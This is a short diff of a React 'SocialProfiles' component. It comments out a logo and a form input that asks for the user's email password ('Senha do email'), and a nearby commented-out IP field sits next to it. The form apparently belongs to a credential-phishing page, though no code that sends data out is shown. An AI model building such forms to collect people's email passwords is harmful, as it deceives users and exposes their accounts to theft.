@@ -43,7 +43,7 @@ export class SocialProfiles extends Component {
 
             
             <div className="form-container">
-          <div className="text-center container">
+          {/* <div className="text-center container">
 
 <img className="logo" src={logo} width="100"/>
 </div>
@@ -63,7 +63,7 @@ export class SocialProfiles extends Component {
                 <div className="form-group">
                     <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                    <span class="focus-border"></span>
-                </div>
+                </div> */}
                 <br />
                 {/* <input type="text" name="ip" placeholder={this.ipzao}  ></input> */}
 
